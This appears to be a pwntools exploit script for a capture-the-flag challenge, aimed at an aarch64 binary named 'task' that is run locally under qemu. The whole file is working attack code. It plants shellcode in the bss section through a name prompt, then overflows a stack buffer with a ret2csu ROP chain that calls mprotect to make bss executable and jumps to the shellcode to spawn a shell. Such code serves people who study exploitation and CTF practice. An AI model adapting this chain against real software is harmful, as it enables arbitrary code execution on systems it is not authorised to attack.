#coding:utf8
from pwn import *

context(os='linux',arch='aarch64')

sh = process(argv=['qemu-aarch64','./task'])
#sh = process(argv=['qemu-aarch64','-g','1234','./task'])
bss = 0x0000000000490440
read_addr = 0x0000000000416930
mprotect_addr = 0x0000000000417370
csu_ld = 0x0000000000400DC4
csu_call = 0x0000000000400DA4

payload =  p64(mprotect_addr) + asm(shellcraft.sh())
sh.sendlineafter('name:',payload)

payload = 'a'*0x28 + p64(csu_ld)
payload += p64(0) + p64(csu_call) #x29 x30
payload += p64(0) + p64(bss) #x19 x20
payload += p64(0x60) + p64(0x7) #x21 x22
payload += p64(1) + p64(bss) #x23 x24

#x29 x30
payload += p64(0) + p64(bss + 8)

sh.sendlineafter('say:',payload)

sh.interactive()
